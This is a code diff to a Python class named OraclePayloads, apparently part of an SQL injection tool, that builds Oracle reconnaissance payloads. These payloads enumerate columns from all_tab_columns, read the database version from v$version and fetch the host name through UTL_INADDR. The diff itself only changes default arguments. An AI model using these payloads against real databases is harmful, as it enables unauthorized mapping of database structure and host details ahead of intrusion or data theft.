@@ -13,7 +13,7 @@ from INFO.ccolumns import commom_table_naming
 
 class OraclePayloads:
     @staticmethod
-    def db_column_payload(column=choice(commom_table_naming() if commom_table_naming() is not None else ""),table=choice(tables)):
+    def db_column_payload(column=commom_table_naming() if commom_table_naming() is not None else list(columns),table=choice(tables)):
         payload = f"""
 
     SELECT {column} FROM {table};
@@ -25,7 +25,7 @@ class OraclePayloads:
         return str(retval)
     
     @staticmethod
-    def db_column_list(table=choice(tables),column=choice(commom_table_naming() if commom_table_naming() is not None else ""),tablename="blah",owner="foo",**kwargs):
+    def db_column_list(table=choice(tables),column=commom_table_naming() if commom_table_naming() is not None else "",tablename="blah",owner="foo",**kwargs):
         payload = f"""
 SELECT {column} FROM all_tab_columns WHERE {table} = '{tablename}';
 SELECT column_name FROM all_tab_columns WHERE {table} = '{tablename}' and owner = '{owner}';"""
@@ -33,7 +33,7 @@ SELECT column_name FROM all_tab_columns WHERE {table} = '{tablename}' and owner 
         return str(retval)
     
     @staticmethod
-    def oracle_injection_payload(table=choice(tables),column=choice(commom_table_naming() if commom_table_naming() is not None else ""),view="v$version"):
+    def oracle_injection_payload(table=choice(tables),column=commom_table_naming() if commom_table_naming() is not None else "",view="v$version"):
         #TODO: create parameters in argprase for indicating table and columns and prompt it from the user
         #!view column : v$version
         #!Oracle% : oracle db version
@@ -48,7 +48,7 @@ SELECT {column} FROM {view};
         return str(retval)
     
     @staticmethod
-    def oracle_injection_database_list(column=choice(commom_table_naming() if commom_table_naming() is not None else ""),table=choice(tables)):
+    def oracle_injection_database_list(column=commom_table_naming() if commom_table_naming() is not None else "",table=choice(tables)):
         payload = f"""
 SELECT DISTINCT {column} FROM {table};
  """
@@ -56,7 +56,7 @@ SELECT DISTINCT {column} FROM {table};
         return str(retval)
     
     @staticmethod 
-    def Host_name_oracle(hostname=choice(columns),viewcolumn=choice(commom_table_naming()),table=choice(tables)):
+    def Host_name_oracle(hostname=choice(columns),viewcolumn=commom_table_naming(),table=choice(tables)):
         payload = f"""
 SELECT {hostname} FROM {viewcolumn};
 SELECT UTL_INADDR.get_host_name FROM {table};
